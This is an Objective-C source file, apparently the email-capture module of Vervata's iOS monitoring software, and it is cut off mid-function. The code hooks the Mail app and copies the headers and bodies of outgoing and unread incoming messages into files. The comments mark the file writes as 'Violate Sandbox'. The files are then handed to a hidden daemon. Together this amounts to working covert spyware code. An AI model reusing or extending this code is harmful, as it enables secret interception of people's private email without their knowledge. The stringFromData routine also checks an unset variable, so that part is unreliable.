/**
 - Project name :  MSFSP
 - Class name   :  MailUtils
 - Version      :  1.0  
 - Purpose      :  For MS
 - Copy right   :  18/11/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
 */


#import "MailUtils.h"
#import "WebMessageDocument.h"
#import "Message.h"
#import "MimeBody.h"
#import "MessageBody.h"
#import "DefStd.h"
#import "MessagePortIPCSender.h"

#import "MimePart.h"
#import "NSData+Base64.h"
#import "MutableMessageHeaders.h"
#import "MessageHeaders.h"
#import "DaemonPrivateHome.h"
#import "MFOutgoingMessageDelivery.h"
#import "PlainTextDocument.h"
#import "MFMailMimePart.h"
#import "OutgoingMessageDelivery.h"
#import "CapturedMailDAO.h"

#import "MailMessageLibrary.h"
#import "MessageDetails.h"
#import "MFMessageInfo.h"
#import "MFMessage.h"

#import "SharedFile2IPCSender.h"

#import <objc/runtime.h>

static NSString *kCapturedMailDBName		= @"capturedmail.db";
static const NSUInteger kMailMarkReadFlag	= 0x01;
static MailUtils *_MailUtils = nil;

@interface MailUtils (private)

- (NSString *)	getPlainTextFromArray: (NSArray *) aContents;
- (void)		printMimePartDetail: (MimePart *) aPart;
- (NSString *)	createStringFromMessageContent: (id) aContents html: (BOOL*) isHtml;

- (NSString*) stringFromData: (NSData *) aData encoding: (NSString *) aEncodingName;
- (NSArray*) headerPart: (id) aHeader;
- (NSArray*) bodyPart: (NSString *) aBody
			   isHTML: (BOOL) aHtml;
- (NSArray *) pureEmailAddressesFromMakeUpEmailAddresses: (NSArray *) aMakeUpEmailAddresses;

- (NSArray*) bodyPart: (id) aMessage 
			 mimeBody: (id) aMimeBody;

- (void) writeMailMessageWithHeaders: (NSArray *) aHeader
							mailType: (MailType) aType
				      mailTimeStamps: (double) aTimeStamps
							 andBody: (NSArray *) aBody;

- (BOOL) sendMailInfo: (NSData *) aMailData;

- (NSString *) stringFromMimePart: (MimePart *) aMimePart appendToString: (NSString *) aString;
- (BOOL) isMailMarkAsRead: (Message *) aMessage;

@end

@implementation MailUtils

@synthesize mMailSharedFileSender;

+ (MailUtils *) sharedMailUtils {
	if (_MailUtils == nil) {
		_MailUtils = [[MailUtils alloc] init];					
	
		if ([[[UIDevice currentDevice] systemVersion] intValue] >= 7) {
			SharedFile2IPCSender *sharedFileSender = nil;
			
			sharedFileSender = [[SharedFile2IPCSender alloc] initWithSharedFileName:kEmailMessagePort];
			[_MailUtils setMMailSharedFileSender:sharedFileSender];
			[sharedFileSender release];
			sharedFileSender = nil;
		}
	}
	return (_MailUtils);	
}
/**
 - Method name:init
 - Purpose: This method is used to initialize the MailUtils class.
 - Argument list and description: No Argument
 - Return type and description: self (MailUtils instance)
 */

- (id) init {
	if ((self = [super init])) {
			
	}
	return (self);
}

#pragma mark Capture Mail Headers and Body
#pragma mark =============================

/**
 - Method name:		outgoingMessageWithOutgoingMessageDelivery:andMessage
 - Purpose:			This method is used to capture outgoing mail 
 - Argument list and description: aMessage (OutgoingMessageDelivery *), aContents (NSString *, NSArray *, OutgoingMessageDelivery * )
 - Return type and description: No return type. 
 */
// tested for outgoing email on ios 5.0.1 iphone 4
- (void) outgoingMessageWithOutgoingMessageDelivery: (id) aMessageDelivery 
										andContents: (id) aContents {
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	BOOL ishtml = NO;
	
	NSArray *headers = [self headerPart:[aMessageDelivery originalHeaders]];	//Get Headers
	
	//DLog(@"=======>aMessage Class:%@", aMessage);
	DLog(@"=======>aMessage Class:%@", [aMessageDelivery class]);	// Class:OutgoingMessageDelivery
	//DLog(@"=======>aContents Class:%@", aContents);
	DLog(@"=======>aContents Class:%@", [aContents class]);
	id msgContents = nil;
	
	// get message string from different kind of object
	msgContents = [self createStringFromMessageContent:aContents html:&ishtml];
	DLog (@"returned isHtml: %d", ishtml)
	DLog (@"msgContents: %@", msgContents)
	
	NSArray *body = [self bodyPart:msgContents								// Get Body	
							isHTML:ishtml];
	Message *message = (Message *)[aMessageDelivery message];
	DLog (@">> timestamp %f", [message dateSentAsTimeIntervalSince1970])
	
	//send mail to message port
	[self writeMailMessageWithHeaders:headers
							 mailType:kMailOutgoing
					   mailTimeStamps:[message dateSentAsTimeIntervalSince1970]
							  andBody:body];
	//DLog (@"===========>Outgoing Mail Headers\n=======================\n:%@", headers)
	//DLog (@"===========>Outgoing Mail Body\n=======================\n:%@", body)
	[pool release];
}

/**
 - Method name:		outgoingMessageWithOutgoingMessageDelivery:andContentArray
 - Purpose:			This method is used by initWithHeaders:HTML:plainTextAlternative:other: of MFOutgoingMessageDelivery
 - Argument list and description:	aMessage (OutgoingMessageDelivery), aContentArray (NSArray*)
 - Return type and description:		No return type. 
 */

- (void) outgoingMessageWithOutgoingMessageDelivery: (id) aMessageDelivery
									andContentArray: (id) aContentArray {
	NSMutableString *mutableReadbleContentString = [NSMutableString string];
	for (id eachContent in aContentArray) {
		DLog(@"class of each content %@", [eachContent class]);
		if ([eachContent isKindOfClass:[NSString class]]) {
			DLog(@"this element is string")
			[mutableReadbleContentString appendString:eachContent];
		}
	}
	DLog(@"readable string: %@", mutableReadbleContentString)
	NSString *readableContentString = [NSString stringWithString:mutableReadbleContentString];
	[self outgoingMessageWithOutgoingMessageDelivery:aMessageDelivery  
										 andContents:readableContentString];
}

/**
 - Method name: incomingWithMessage:andMimeBody
 - Purpose:  This method is used to capture incoming mail 
 - Argument list and description: aMimeBody (MutableMessageHeaders *,LocalizedMessageHeader *),aMessage(Message *)
 - Return type and description: No return type. 
 */

- (void) incomingWithMessage: (id) aMessage 
				 andMimeBody: (id) aMimeBody {
    
    DLog (@"aMessage remoteID   = %@", [aMessage remoteID]);
    DLog (@"aMessage uid        = %lu", [(MFMessage *)aMessage uid]);
    
    // a.) Incoming mail must have uid and remoteID
    if ([(MFMessage *)aMessage uid] != 0 && [aMessage remoteID]) {
        CapturedMailDAO *mailDAO = [[CapturedMailDAO alloc] initWithDBFileName:kCapturedMailDBName];
        
        // b.) Incoming mail must not be captured previously
        BOOL capture = (![mailDAO isUIDAlreadyCapture:[(MFMessage *)aMessage uid]] ||
                        ![mailDAO isRemoteIDAlreadyCapture:[aMessage remoteID]]);
        
        /*
         *
         iOS 8.1 (tested):
         After user deletes messages from sent folder (may be inbox, outbox, ...) on Gmail web account; when new message arrived Mail
         application it reuses uid & remoteID of deleted messages that's why we need to check one more condition which is externalID
         *
         */
        
        if ([(MFMessage *)aMessage respondsToSelector:@selector(externalID)]) {
            DLog (@"externalID = %@", [(MFMessage *)aMessage externalID])
            if (!capture) {
                capture = ![mailDAO isExternalIDAlreadyCapture:[(MFMessage *)aMessage externalID]];
            }
        }
        
        // c.) Incoming mail must be unread
        if (capture && ![self isMailMarkAsRead:aMessage]) {
            /****************************************************************************
             NOTE:
             - remoteID and uid is the same but one is string another is unsigned int
             - Microsoft Exchange remoteID and uid (always the same) is different
            ****************************************************************************/
            
            [mailDAO insertUID:[(MFMessage *)aMessage uid] remoteID:[aMessage remoteID]];
            if ([(MFMessage *)aMessage respondsToSelector:@selector(externalID)]) {
                [mailDAO insertExternalID:[(MFMessage *)aMessage externalID]];
            }
            
            DLog (@"===========> New Incomming Mail found!");
            
            // Get Headers
            NSArray *headers=[self headerPart:[aMessage headers]];
            // Get Body
            NSArray *body=[self bodyPart:aMessage 
                                mimeBody:aMimeBody];
            
            // Send mail to message port
            [self writeMailMessageWithHeaders:headers
                                     mailType:kMailIncomming
                               mailTimeStamps:[aMessage dateReceivedAsTimeIntervalSince1970]
                                      andBody:body];
            
            DLog (@"===========>Outgoing Mail Headers=======================");
            DLog (@"headers = %@", headers);
            DLog (@"===========>Outgoing Mail Body==========================");
            DLog (@"body = %@", body);
        } else {
            DLog (@"===========> Not New Incomming Mail >>>");
        }
        [mailDAO release];
    } else {
        DLog (@"===========> Not Incomming (New Outgoing) Mail >>>");
    }
}

/**
 - Method name: deliveredOutgoingMail
 - Purpose:  This method is used to send captured email to daemon after it delivers successfully 
 - Argument list and description: aTimeStamps is time stamp of delivered email
 - Return type and description: No return type. 
 */
- (void) deliveredOutgoingMail: (double) aTimeStamps {
	DLog (@"Email delivered successfully >>>>")
    NSFileManager *fileManager = [NSFileManager defaultManager];
	NSString *outgoingMailPath = [NSString stringWithFormat:@"%@mail_%lf.dat", [DaemonPrivateHome daemonSharedHome], aTimeStamps];
    if (![fileManager fileExistsAtPath:outgoingMailPath]) {
        // Violate Sandbox
        outgoingMailPath = [NSString stringWithFormat:@"%@mail_%lf.dat", NSTemporaryDirectory(), aTimeStamps];
    }
	if (![self sendMailInfo:[outgoingMailPath dataUsingEncoding:NSUTF8StringEncoding]]) {
		// Assume daemon not capture (flag) email thus delete this email
		[fileManager removeItemAtPath:outgoingMailPath error:nil];
	}
}

/**
 - Method name: removeUnsentMail
 - Purpose:  This method is used to remove captured email file after it delivers unsuccessfully 
 - Argument list and description: aTimeStamps is time stamp of unset email
 - Return type and description: No return type. 
 */

- (void) removeUnsentMail: (double) aTimeStamps {
	NSError *error = nil;
	NSFileManager *fileManager = [NSFileManager defaultManager];
	NSString *unsentMailPath=[NSString stringWithFormat:@"%@mail_%lf.dat",[DaemonPrivateHome daemonSharedHome],aTimeStamps];
    if (![fileManager fileExistsAtPath:unsentMailPath]) {
        // Violate Sandbox
        unsentMailPath = [NSString stringWithFormat:@"%@mail_%lf.dat", NSTemporaryDirectory(), aTimeStamps];
    }
	if([fileManager removeItemAtPath:unsentMailPath error:&error]) { DLog (@"Removed unsent mail from the path sucessfully") }
	else { DLog (@"Error occured while removing ...") }
}

- (void) printMimePartDetail: (MimePart *) aPart {
	DLog (@"data: %@", [aPart bodyData]);
	DLog (@"type: %@", [aPart type])
	DLog (@"subtype: %@", [aPart subtype])
	DLog (@"isReadableText: %d", [aPart isReadableText])
	DLog (@"contentTransferEncoding: %@", [aPart contentTransferEncoding])
	DLog (@"attachments: %@", [aPart attachments])
	DLog (@"isAttachment: %d", [aPart isAttachment])
	DLog (@"isRich: %d", [aPart isRich])
	DLog (@"isHTML: %d", [aPart isHTML])
	DLog (@"textHtmlPart: %@", [aPart textHtmlPart])
}


/**
 - Method name:		getPlainTextFromArray:html
 - Purpose:			create NSString extracted from NSArray's element whose type is PlainTextDocument
 - Argument list and description: aContents (NSArray *)
 - Return type and description: NSString * 
 */
- (NSString *) getPlainTextFromArray: (NSArray *) aContents {
	NSMutableString *mutableMsgContents = [NSMutableString string];
	for (id eachContent in aContents) {
		/*
		 There is no longer MIME.framework in iOS 7
		 */
		Class $PlainTextDocument	= objc_getClass("PlainTextDocument");	
		Class $MFPlainTextDocument	= objc_getClass("MFPlainTextDocument");
		
		if ([eachContent isKindOfClass:$PlainTextDocument]			|| // ios 6
			[eachContent isKindOfClass:$MFPlainTextDocument]		){ // ios 7
			DLog (@"PlainTextDocument: --> aContent %@", [eachContent string]);
			[mutableMsgContents appendString:[eachContent string]];
		} else {
			DLog (@"NON-PlainTextDocument -> %@", eachContent)
		}
	}
	NSString *msgContents = nil;
	if ([mutableMsgContents length])
		msgContents = [[NSString alloc] initWithString:mutableMsgContents];
	else
		msgContents = [[NSString alloc] init];
	return [msgContents autorelease];
}

/**
 - Method name:		createStringFromMessageContent:html
 - Purpose:			create NSString extracted from the content
 - Argument list and description: aContents (NSArray *, NSString *, OutgoingMessageDelivery *), isHtml (BOOL *)
 - Return type and description: NSString *
 */
- (NSString *) createStringFromMessageContent: (id) aContents html: (BOOL*) isHtml {
	NSString *msgContents = nil;
	if ([aContents isKindOfClass:[NSArray class]]) {					// -- CASE 1: NSArray 
		DLog(@"content is NSArray with count %lu",  (unsigned long)[aContents count])
		msgContents = [[NSString alloc] initWithString:[self getPlainTextFromArray:aContents]];
		if (isHtml)
			*isHtml = NO;	
	}
	else if ([aContents isKindOfClass:[NSString class]]) {				// -- CASE 2: NSString
		DLog(@"content is NSString (It is also HTML)")
		msgContents = [[NSString alloc] initWithString:(NSString *) aContents];
		if (isHtml)
			*isHtml = YES;	
    }
	else {																// -- CASE 3: Message
		DLog(@"content is OTHER")
		Class $Message = objc_getClass("Message");
		Message *msg = nil;												// get Message
		
//		if (aContents && [aContents isKindOfClass:[OutgoingMessageDelivery class]]) { // iOS 5, cannot load mobile substrate since there is no class OutgoingMessageDelivery
//			msg = (Message*) [aContents message];	
//			DLog(@"> content is OutgoingMessageDelivery")
//		} else if (aContents && [aContents isKindOfClass:[Message class]]) {
//			msg = aContents;
//			DLog(@"> content is Message")
//		}
		
		// Then we do ask the question in the other the way around
		if (aContents && [aContents isKindOfClass:$Message]) {
			msg = aContents;
			DLog(@"> content is Message")
		} else if (aContents) {
			msg = (Message*) [aContents message];
			DLog(@"> content is OutgoingMessageDelivery");
		}
		
		DLog (@"[msg contentType] : %@", [msg contentType])		
		MimeBody *mimeBody = [msg messageBody];					// get MimeBody
		DLog (@"[mimeBody mimeType]/[mimeBody mimeSubtype]: %@/%@", [mimeBody mimeType],  [mimeBody mimeSubtype])
		
		MimePart *mimePart = (MimePart *) [mimeBody preferredBodyPart];		// get MimePart
		DLog (@"mimePart = %@", mimePart);
		
		msgContents = [[NSString alloc] initWithString:[self stringFromMimePart:mimePart appendToString:@""]];
		
		/*
		NSArray *subparts = [mimePart subparts];							// get sub parts of MimePart
		NSMutableData *readableData = [NSMutableData data];
		if (subparts != nil) {												// CASE 3.1: MimePart contains sub-parts
			if ([subparts count] > 0) {
				for (MimePart *eachSubpart in subparts) {
					[self printMimePartDetail:eachSubpart];
					if ([eachSubpart isReadableText])
						[readableData appendData:[eachSubpart bodyData]];
				}
				//DLog (@"length of new NSData %d", [readableData length])
				if ([readableData length] > 0) 
					msgContents = (NSString*) [[NSString alloc] initWithData:readableData encoding:NSUTF8StringEncoding];		
				else
					msgContents = [[NSString alloc] init];
			} else {
				DLog (@"ZERO subparts")
				msgContents = [[NSString alloc] init];
			}
		} else {															// CASE 3.2: MimePart DOES NOT contain sub-parts
			DLog (@"No subpart of main MimePart")
			[self printMimePartDetail:mimePart];
			if ([mimePart isReadableText]) 
				[readableData appendData:[mimePart bodyData]];
			if ([readableData length] > 0) 
				msgContents = (NSString*) [[NSString alloc] initWithData:readableData encoding:NSUTF8StringEncoding];
			else
				msgContents = [[NSString alloc] init];
		}*/
		if (isHtml)
			*isHtml=YES;
	}
	return [msgContents autorelease];
}

#pragma mark MailUtils Helper Methods
#pragma mark =========================

/**
 - Method name: headerPart:
 - Purpose:  This method is used to get header from incoming/outgoing mail 
 - Argument list and description: aHeader (MessageHeaders *)
 - Return type and description: resultArray (NSArray *)
*/

- (NSArray *) headerPart: (id) aHeader {
	DLog (@"aHeader = %@", aHeader);
	NSMutableArray *resultArray=[[NSMutableArray alloc]init];
	NSMutableDictionary *dict=[[NSMutableDictionary alloc]init];
	NSMutableArray *toArr	=[NSMutableArray array];
	NSMutableArray *ccArr	=[NSMutableArray array];
	NSMutableArray *bccArr	=[NSMutableArray array];

	NSString *senderAddr=@"";
	NSString *subjectLine=@"";	
	NSArray *subject=[aHeader _headerValueForKey:@"subject"];
	if([subject count]) subjectLine=[subject objectAtIndex:0];
	//For Outgoing Mail
	Class $MutableMessageHeaders = objc_getClass("MutableMessageHeaders");			// ios 6
	Class $MFMutableMessageHeaders = objc_getClass("MFMutableMessageHeaders");		// ios 7
	//if([aHeader isKindOfClass:[MutableMessageHeaders class]]){ // Required link to framework
	// Objective C runtime
	if ([aHeader isKindOfClass:$MutableMessageHeaders]					||		// ios 6
		[aHeader isKindOfClass:$MFMutableMessageHeaders]				){		// ios 7
		MutableMessageHeaders *header=(MutableMessageHeaders *)aHeader;
		toArr=[[header copyAddressListForTo] autorelease];
		ccArr=[[header copyAddressListForCc] autorelease];
		bccArr=[[header copyAddressListForBcc] autorelease];
		NSArray *sender=[header copyAddressListForSender];
		if([sender count]) senderAddr=[sender objectAtIndex:0];
	}
	else
	{
	// For Incomming Mail	
	  NSArray *to=[aHeader _headerValueForKey:@"To"];
	  NSArray *cc=[aHeader _headerValueForKey:@"Cc"];
	  NSArray *bcc=[aHeader _headerValueForKey:@"Bcc"];
	  NSArray *sender=[aHeader _headerValueForKey:@"From"];
	  NSString *toAddress=@"";
	  NSString *ccAddress=@"";
	  NSString *bccAddress=@"";
	  
	  if([to count]) toAddress=[to objectAtIndex:0];
	  if([cc count]) ccAddress=[cc objectAtIndex:0];
	  if([bcc count]) bccAddress=[bcc objectAtIndex:0];
	  if([sender count]) senderAddr=[sender objectAtIndex:0];
	  if([toAddress length]){
			NSArray *to=[toAddress componentsSeparatedByString:@","];
			DLog(@"To Address:%@",to);
			for (NSString *toAddr in to)
				[toArr addObject:toAddr];
			if(![to count])
				[toArr addObject:toAddress];
	  }
		//CC
	   if([ccAddress length]){
			NSArray *cc=[ccAddress componentsSeparatedByString:@","];
			for (NSString *ccAddr in cc)
				[ccArr addObject:ccAddr];
			if(![cc count])
				[ccArr addObject:ccAddress];
	    }
		//BCC
	   if([bccAddress length]){
			NSArray *bcc=[bccAddress componentsSeparatedByString:@","];
			for (NSString *bccAddr in bcc)
				[bccArr addObject:bccAddr];
			if(![bcc count])
				[bccArr addObject:bccAddress];
	   }
	}
	
	// Get pure email address NOT the make up one from the server or email client
	// TO
	NSArray *array = [self pureEmailAddressesFromMakeUpEmailAddresses:toArr];
	toArr = [NSMutableArray arrayWithArray:array];
	// CC
	array = [self pureEmailAddressesFromMakeUpEmailAddresses:ccArr];
	ccArr = [NSMutableArray arrayWithArray:array];
	// BCC
	array = [self pureEmailAddressesFromMakeUpEmailAddresses:bccArr];
	bccArr = [NSMutableArray arrayWithArray:array];
	
	NSArray *senderAddrArr = [NSArray arrayWithObject:senderAddr];
	senderAddrArr = [self pureEmailAddressesFromMakeUpEmailAddresses:senderAddrArr];
	senderAddr = [senderAddrArr objectAtIndex:0];
	
	[dict setObject:toArr forKey:kMAILTo];
	[dict setObject:ccArr forKey:kMAILCc];
	[dict setObject:bccArr forKey:kMAILBCc];
	[dict setValue:senderAddr forKey:kMAILFrom];
	[dict setValue:subjectLine forKey:kMAILSubject];
	[resultArray addObject:dict];
	[dict release];
   	return [resultArray autorelease];
}


/**
 - Method name: bodyPart:mimeBody
 - Purpose:  This method is used to get message body from mime body
 - Argument list and description: aHeader (MimeBody *)
 - Return type and description: resultArray (NSArray *)
*/

- (NSArray *) bodyPart: (id) aMessage 
		      mimeBody: (id) aMimeBody {
	MimePart *part = (MimePart *)[aMimeBody preferredBodyPart];
	id bodyData = nil;
	
	// Method to get single part html email
//	BOOL isHTML = NO;
//	DLog (@"part = %@", part);
//	if ([part isHTML] && ![[part subparts] count]) {
//		isHTML = YES;
//		MFMailMimePart *htmlPart = [part textHtmlPart];
//		DLog (@"htmlPart = %@, encoding = %d", htmlPart, [htmlPart textEncoding]); // Cannot use to pass to string encoding
//		NSArray *htmlArr = [htmlPart htmlContent];
//		DLog (@"htmlArr = %@", htmlArr);
//		if([htmlArr count]) {
//			id object = [htmlArr objectAtIndex:0];
//			DLog (@"object's class = %@", [object class]);
//			if ([object isKindOfClass:[WebMessageDocument class]]) { // iOS 4.2.1 (4)
//				WebMessageDocument *document = object;
//				DLog (@"document = %@, htmlData = %@, characterSet = %@", document, [document htmlData], [document preferredCharacterSet]);
//				bodyData = [self stringFromData:[document htmlData] encoding:[document preferredCharacterSet]];
//			} else if ([object isKindOfClass:[NSString class]]) { // iOS 5.1.1 tether jail break (3gs)
//				// When capture incoming image when it's not complete object which suppose to be WebMessageDocument will be NSString
//				bodyData = object;
//			}
//		}
//	} else {
//		DLog (@"Html with multipart or multipart with html part");
//		bodyData = [self createStringFromMessageContent:aMessage html:&isHTML]; // Message
//	}
	
	bodyData = [self stringFromMimePart:part appendToString:@""];
	DLog (@"bodyData = %@", bodyData);
	return [self bodyPart:bodyData isHTML:[part isHTML]];
}

/**
 - Method name: bodyPart:mimeBody
 - Purpose:  This method is used to get message body from string
 - Argument list and description: aHeader (MimeBody *)
 - Return type and description: resultArray (NSArray *)
 */

- (NSArray *) bodyPart: (NSString *) aBody 
				 isHTML: (BOOL) aHtml {
	NSMutableArray *resultArray=[[NSMutableArray alloc]init];
	NSMutableDictionary *dict=[[NSMutableDictionary alloc]init];
	[dict setValue:aBody forKey:kMAILMessage];
	if(aHtml)
		[dict setValue:kMAILBodyTypeHtml forKey:kMAILMessageType];	// html type
	else 
		[dict setValue:kMAILBodyTypeText forKey:kMAILMessageType];	// text type
	[resultArray addObject:dict];
	[dict release];
	return [resultArray autorelease];
}

/**
 - Method name: pureEmailAddressesFromMakeUpEmailAddresses:
 - Purpose:  This method is used parse email address from make up email address which generate by mail client and mail server
 - Argument list and description: aMakeUpEmailAddress (NSArray *)
 - Return type and description: (NSArray *) A make up email addresses 
 */

// --------------- TEST CASE ------------------
/*
NSArray *makeUpEmailAddresses = [NSArray arrayWithObjects:@"twoGmailNEW Gm <developerteamtwo@gmail.com>",
								 @"",
								 @"anil@scitech.au.edu",
								 @"Jay Hello <jkuay@hotmail.com>",
								 @"<>",
								 nil];
NSArray *pureEmailAddresses = [self pureEmailAddressesFromMakeUpEmailAddresses:makeUpEmailAddresses];
NSLog(@"pureEmailAddresses = %@", pureEmailAddresses);
*/

// With reference to Atir's email about email header's protocol

- (NSArray *) pureEmailAddressesFromMakeUpEmailAddresses: (NSArray *) aMakeUpEmailAddresses {
	NSMutableArray *pureEmailAddresses = [NSMutableArray array];
	for (NSString *makeUpEmailAddress in aMakeUpEmailAddresses) {
		NSRange begin = [makeUpEmailAddress rangeOfString:@"<"];
		NSRange end = [makeUpEmailAddress rangeOfString:@">"];
		if (begin.location != NSNotFound && end.location != NSNotFound) {
			NSString *email = [makeUpEmailAddress substringWithRange:NSMakeRange(begin.location + 1,
																				 end.location - begin.location - 1)];
			[pureEmailAddresses addObject:email];
		} else {
			[pureEmailAddresses addObject:makeUpEmailAddress];
		}
	}
	return (pureEmailAddresses);
}

/**
 - Method name: writeMailMessageWithHeaders:mailType:andBody
 - Purpose:  This method is used to write the mail message to the Message Port
 - Argument list and description: aHeader (NSArray *),aType(MailType),aBody(NSArray *)
 - Return type and description: No Return 
*/

- (void) writeMailMessageWithHeaders: (NSArray *) aHeader
							mailType: (MailType) aType
				      mailTimeStamps: (double) aTimeStamps
							 andBody: (NSArray *) aBody {
						      
	NSMutableDictionary *dictionary=[[NSMutableDictionary alloc]init];
	NSMutableData*mailData = [[NSMutableData alloc] init];
	[dictionary setObject:aHeader forKey:kMAILHeaders];
	[dictionary setObject:aBody forKey:kMAILBody];
	if(aType==kMailIncomming)
		[dictionary setValue:kMAILTypeIncomming forKey:kMAILType];
	else 
		[dictionary setValue:kMAILTypeOutgoing forKey:kMAILType];
	
    // Write & send Data
	NSKeyedArchiver *archiver = [[NSKeyedArchiver alloc] initForWritingWithMutableData:mailData];
	[archiver encodeObject:dictionary forKey:kMAILMonitorKey];
	[archiver finishEncoding];
	
	NSString *filePath = nil;
	if (aType == kMailIncomming) {
		// /xx/xx/mail_TS_randomId.dat
		// Append randomId value to file name to reduce possibility of duplicate name when incoming mail is received concurrently
		// which could lead to daemon delete file which not yet read mail data..
		NSUInteger ran = (arc4random() % 1000);
        unsigned int randomId = (unsigned int)ran;
		filePath = [NSString stringWithFormat:@"%@mail_%lf_%d.dat", [DaemonPrivateHome daemonSharedHome], aTimeStamps, randomId];
        if (![mailData writeToFile:filePath atomically:YES]) {
            // Violate Sandbox
            filePath = [NSString stringWithFormat:@"%@mail_%lf_%d.dat",NSTemporaryDirectory(),aTimeStamps,randomId];
            [mailData writeToFile:filePath atomically:YES];
        }
	} else {
		// /xx/xx/mail_TS.dat
		filePath = [NSString stringWithFormat:@"%@mail_%lf.dat", [DaemonPrivateHome daemonSharedHome], aTimeStamps];
        if (![mailData writeToFile:filePath atomically:YES]) {
            // Violate Sandbox
            filePath = [NSString stringWithFormat:@"%@mail_%lf.dat",NSTemporaryDirectory(),aTimeStamps];
            [mailData writeToFile:filePath atomically:YES];
        }
	}
	
    if(aType == kMailIncomming) {
		if (![self sendMailInfo:[filePath dataUsingEncoding:NSUTF8StringEncoding]]) {
			// Assume daemon not capture (flag) email thus delete this email
			NSFileManager *fileManager = [NSFileManager defaultManager];
			[fileManager removeItemAtPath:filePath error:nil];
		}
	} // Otherwise outgoing mail have to wait for deliver success
	[archiver release];
	[dictionary release];
	[mailData release];
	DLog (@"==== write mail message to the Message Port =====")
}
	
- (BOOL) sendMailInfo: (NSData *) aMailData {	
	BOOL ok = FALSE;
	
	if ([[[UIDevice currentDevice] systemVersion] intValue] <= 6) {
		MessagePortIPCSender* messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:kEmailMessagePort];
		ok = [messagePortSender writeDataToPort:aMailData];
		[messagePortSender release];
		DLog (@"Write email to message port successfully = %d", ok);
	} else {
		SharedFile2IPCSender *sharedFileSender = nil;
		sharedFileSender = [[MailUtils sharedMailUtils] mMailSharedFileSender];
		ok = [sharedFileSender writeDataToSharedFile:aMailData];
	}
	return (ok);
}

- (NSString *) stringFromMimePart: (MimePart *) aMimePart appendToString: (NSString *) aString {
	NSString *readableText = @"";
	DLog (@"aMimePart = %@", aMimePart);
	DLog (@"readable = %d, html = %d, rich = %d, att = %d", [aMimePart isReadableText], [aMimePart isHTML], [aMimePart isRich], [aMimePart isAttachment]);
	
	if ([[aMimePart subparts] count] == 0) { // Only one part
		if ([aMimePart isReadableText] || [aMimePart isHTML] || [aMimePart isRich]) {
			//DLog (@"decode text = %@", [aMimePart decodeText]);
			readableText = [aMimePart decodeText];
			readableText = [aString stringByAppendingFormat:@"%@\n\n", readableText];
		} else {
			readableText = [aString stringByAppendingString:readableText];
		}
	} else { // More than one part
		for (MimePart *subPart in [aMimePart subparts]) {
			readableText = [self stringFromMimePart:subPart appendToString:readableText];
		}
	}
	//DLog (@"readableText = %@", readableText);
	return (readableText);
}

- (BOOL) isMailMarkAsRead: (Message *) aMessage {
	BOOL isMark = NO;
	DLog (@"Message ID is library ID = %@", [aMessage messageID]);
	Class libraryMail = objc_getClass("MailMessageLibrary"); // iOS 4
	if (libraryMail == nil) {
		libraryMail = objc_getClass("MFMailMessageLibrary"); // iOS 5
	}
	id libraryMailObj = [libraryMail defaultInstance];
	id mailboxURL = [libraryMailObj mailboxURLForMessage:aMessage];
	DLog (@"mailboxURL = %@", mailboxURL);
	
	// A)-Method 1, failed in case of user setup gmail using exchange mail...
//	NSArray *allMailDetails = [libraryMailObj getDetailsForMessagesWithRemoteIDInRange:NSMakeRange([aMessage uid], 0)
//																			   fromMailbox:mailboxURL];
	
	// B)-Method 2
	NSArray *allMailDetails = [libraryMailObj getDetailsForAllMessagesFromMailbox:mailboxURL];
	DLog(@"allMailDetails = %@", allMailDetails);
    
    // Obsolete from iOS 8; used below loop instead
    /*
	NSInteger length        = ([allMailDetails count] >= 50) ? 50 : [allMailDetails count];
    NSUInteger position     = [allMailDetails count] - length;
	NSArray *mailDetailsArr = [allMailDetails subarrayWithRange:NSMakeRange(position, length)];
	
	DLog(@"Message details from library, mailDetailsArr = %@", mailDetailsArr);
	MessageDetails *mailDetails = nil;
	for (MessageDetails *msgDetails in mailDetailsArr) {
		DLog (@"msg-externalID  = %@", [msgDetails externalID]);    // AB1B09A2-77D7-4119-BD0A-691E32BF24AC
		DLog (@"msg-messageID   = %@", [msgDetails messageID]);
		DLog (@"msg-remoteID    = %@", [msgDetails remoteID]);      // This remoteID is different from [aMessage remoteID]
		if ([[msgDetails messageID] isEqualToString:[aMessage messageID]]) {
			mailDetails = msgDetails;
			break;
		}
	}*/
    
    MessageDetails *mailDetails = nil;
    NSEnumerator *enumerator = [allMailDetails reverseObjectEnumerator];
    while (mailDetails = [enumerator nextObject]) {
        
        //DLog (@"externalID  = %@", [mailDetails externalID]);    // AB1B09A2-77D7-4119-BD0A-691E32BF24AC
		//DLog (@"messageID   = %@", [mailDetails messageID]);
		//DLog (@"remoteID    = %@", [mailDetails remoteID]);      // This remoteID is different from [aMessage remoteID]
        
        if ([[mailDetails messageID] isEqualToString:[aMessage messageID]]) {
            DLog(@"Found desired mail details in new loop");
            break;
        }
    }
    
	DLog (@"mailDetails         = %@", mailDetails);
	
	DLog (@"===================================================================");
	DLog (@"uid                 = %lu", [mailDetails uid]);
	DLog (@"hash                = %d", [mailDetails hash]);
	DLog (@"remoteID            = %@", [mailDetails remoteID]);
	DLog (@"libraryID           = %d", [mailDetails libraryID]);
	DLog (@"mailboxID           = %d", [mailDetails mailboxID]);
	DLog (@"messageFlags        = %llu", [mailDetails messageFlags]);
	DLog (@"messageID           = %@", [mailDetails messageID]);
	DLog (@"mailbox             = %@", [mailDetails mailbox]);
	DLog (@"dataReceived        = %f", [mailDetails dateReceivedAsTimeIntervalSince1970]);
    
	id messageInfo = [mailDetails copyMessageInfo]; // MFMessageInfo belong to iOS 5, MessageInfo belong to iOS4
	DLog (@"messageInfo         = %@", messageInfo);
	DLog (@"messageInfo, read   = %d", [messageInfo read]);
	DLog (@"externalID          = %@", [mailDetails externalID]);
	
	isMark = [messageInfo read]; // Always return read mark since it's automatically reset when we we open thus use flags instead
	isMark = ([mailDetails messageFlags] & kMailMarkReadFlag) ? YES : NO;
	[messageInfo release];
	DLog (@"===================================================================");

	DLog (@"Mail %@ is marked as read: %d", aMessage, isMark);
	return (isMark);
}

/**
 - Method name: stringFromData:
 - Purpose:  This method is used to convert data to string
 - Argument list and description: aData (NSData *)
 - Return type and description: No Return 
*/

- (NSString *) stringFromData: (NSData *) aData encoding: (NSString *) aEncodingName {
	DLog (@"aData = %@, aEncodingName = %@", aData, aEncodingName);
	NSString *contentsFromData = nil;
	if ([contentsFromData isEqualToString:@"windows-1252"]) {
		contentsFromData = [[NSString alloc] initWithData:aData encoding:NSWindowsCP1252StringEncoding];
